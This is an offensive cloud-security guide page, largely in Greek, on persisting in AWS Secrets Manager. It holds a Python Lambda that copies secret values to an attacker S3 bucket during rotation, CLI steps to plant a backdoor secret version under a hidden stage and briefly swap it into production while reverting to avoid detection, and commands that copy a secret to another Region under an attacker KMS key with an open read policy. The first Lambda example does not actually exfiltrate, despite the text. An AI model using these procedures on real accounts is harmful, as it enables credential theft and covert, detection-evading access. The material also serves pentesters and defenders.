# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Μέσω Resource Policies

Είναι δυνατό να **grant access to secrets to external accounts** μέσω resource policies. Check the [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) για περισσότερες πληροφορίες. Σημειώστε ότι για να **access a secret**, ο εξωτερικός λογαριασμός θα χρειαστεί επίσης **access to the KMS key encrypting the secret**.

### Μέσω Secrets Rotate Lambda

Για να **rotate secrets** αυτόματα καλείται μια ρυθμισμένη **Lambda**. Αν ένας attacker μπορούσε να **change** τον **code**, θα μπορούσε απευθείας να **exfiltrate the new secret** στον εαυτό του.

Έτσι θα μπορούσε να μοιάζει ο κώδικας του Lambda για μια τέτοια ενέργεια:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}





### Αντικαταστήστε το rotation Lambda με μια συνάρτηση υπό έλεγχο επιτιθέμενου μέσω RotateSecret

Κακοποιήστε `secretsmanager:RotateSecret` για να επανασυνδέσετε ένα secret σε ένα rotation Lambda που ελέγχεται από τον επιτιθέμενο και να ενεργοποιήσετε άμεση περιστροφή. Η κακόβουλη συνάρτηση εξάγει τις εκδόσεις του secret (AWSCURRENT/AWSPENDING) κατά τα βήματα περιστροφής (createSecret/setSecret/testSecret/finishSecret) σε έναν προορισμό του επιτιθέμενου (π.χ., S3 ή εξωτερικό HTTP).

- Απαιτήσεις
- Permissions: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` on the attacker Lambda, `iam:CreateRole/PassRole/PutRolePolicy` (or AttachRolePolicy) to provision the Lambda execution role with `secretsmanager:GetSecretValue` and preferably `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (so rotation keeps working), KMS `kms:Decrypt` for the secret KMS key, and `s3:PutObject` (or outbound egress) for exfiltration.
- Ένα στοχευμένο secret id (`SecretId`) με ενεργοποιημένη περιστροφή ή τη δυνατότητα να ενεργοποιηθεί η περιστροφή.

- Επίπτωση
- Ο επιτιθέμενος αποκτά την/τις τιμή/ές του secret χωρίς να τροποποιήσει τον νόμιμο κώδικα περιστροφής. Αλλάζει μόνο η ρύθμιση περιστροφής ώστε να δείχνει στο Lambda του επιτιθέμενου. Εάν δεν εντοπιστεί, οι προγραμματισμένες μελλοντικές περιστροφές θα συνεχίσουν να καλούν τη συνάρτηση του επιτιθέμενου.

- Βήματα επίθεσης (CLI)
1) Προετοιμάστε προορισμό exfiltration και ρόλο Lambda
- Δημιουργήστε S3 bucket για exfiltration και έναν ρόλο εκτέλεσης εμπιστευόμενο από το Lambda με δικαιώματα ανάγνωσης του secret και εγγραφής στο S3 (συν logs/KMS όπως απαιτείται).
2) Ανάπτυξη Lambda επιτιθέμενου που σε κάθε βήμα περιστροφής ανακτά την/τις τιμή/ές του secret και τις γράφει στο S3. Η ελάχιστη λογική περιστροφής μπορεί απλώς να αντιγράψει AWSCURRENT σε AWSPENDING και να το προωθήσει στο finishSecret για να διατηρηθεί η υπηρεσία λειτουργική.
3) Επανασύνδεση της περιστροφής και ενεργοποίηση
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Επαληθεύστε την εξαγωγή κάνοντας λίστα στο S3 prefix για εκείνο το secret και εξετάζοντας τα JSON artifacts.
5) (Προαιρετικό) Επαναφέρετε το αρχικό rotation Lambda για μείωση της ανίχνευσης.

- Παράδειγμα Lambda του επιτιθέμενου (Python) που εξάγει σε S3
- Περιβάλλον: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Καταχράσου τις ετικέτες version staging του Secrets Manager για να τοποθετήσεις μια εκδοχή μυστικού υπό έλεγχο του attacker και να τη διατηρήσεις κρυφή κάτω από ένα custom stage (για παράδειγμα, `ATTACKER`) ενώ η παραγωγή συνεχίζει να χρησιμοποιεί την αρχική `AWSCURRENT`. Σε οποιαδήποτε στιγμή, μετακίνησε το `AWSCURRENT` στην εκδοχή του attacker για να μολύνεις εξαρτώμενα workloads, και μετά επαναφέρε το για να ελαχιστοποιήσεις την ανίχνευση. Αυτό παρέχει διακριτική backdoor persistence και γρήγορη manipulation χρόνου-χρήσης χωρίς να αλλάζει το όνομα του secret ή τη rotation config.

- Απαιτήσεις
- Δικαιώματα: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (για επαλήθευση)
- Target secret id στην Region.

- Επιπτώσεις
- Διατήρηση μιας κρυφής, υπό έλεγχο attacker εκδοχής ενός secret και ατομική εναλλαγή του `AWSCURRENT` σε αυτήν κατόπιν ζήτησης, επηρεάζοντας οποιοδήποτε consumer επιλύει το ίδιο όνομα secret. Η εναλλαγή και η γρήγορη επαναφορά μειώνουν την πιθανότητα ανίχνευσης ενώ επιτρέπουν τον προσωρινό συμβιβασμό.

- Βήματα επίθεσης (CLI)
- Προετοιμασία
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>Εντολές CLI</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Σημειώσεις
- Όταν παρέχετε `--client-request-token`, Secrets Manager το χρησιμοποιεί ως το `VersionId`. Η προσθήκη μιας νέας έκδοσης χωρίς ρητή ρύθμιση του `--version-stages` μετακινεί το `AWSCURRENT` στην καινούρια έκδοση από προεπιλογή και σημειώνει την προηγούμενη ως `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Κακόβουλη χρήση της multi-Region replication του Secrets Manager για τη δημιουργία μιας replica ενός στόχου secret σε μια λιγότερο-παρακολουθούμενη Region, κρυπτογραφώντας το με ένα attacker-controlled KMS key σε εκείνη τη Region, στη συνέχεια προώθηση (promote) της replica σε standalone secret και επισύναψη ενός permissive resource policy που παρέχει στον attacker δικαίωμα ανάγνωσης. Το αρχικό secret στην primary Region παραμένει αμετάβλητο, προσφέροντας ανθεκτική, stealthy πρόσβαση στην τιμή του secret μέσω της προωθημένης replica ενώ παρακάμπτονται οι περιορισμοί KMS/policy στην primary.

- Απαιτήσεις
- Permissions: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- Στη replica Region: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (ή `kms:PutKeyPolicy`) για να επιτρέψουν στον attacker principal `kms:Decrypt`.
- Ένας attacker principal (user/role) που θα λάβει δικαίωμα ανάγνωσης στο promoted secret.

- Επιπτώσεις
- Επίμονος cross-Region δρόμος πρόσβασης στην τιμή του secret μέσω μιας standalone replica υπό έναν attacker-controlled KMS CMK και permissive resource policy. Το primary secret στην αρχική Region παραμένει ανεπηρέαστο.

- Attack (CLI)
- Μεταβλητές
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Δημιουργήστε attacker-controlled KMS key στο replica Region
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Αντιγράψτε το secret στο R2 χρησιμοποιώντας το attacker KMS key
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Αναβαθμίστε το αντίγραφο σε αυτόνομο στο R2
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Επισύναψε επιτρεπτική πολιτική πόρων στο αυτόνομο secret στο R2
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Διάβασε το secret από τον attacker principal στο R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

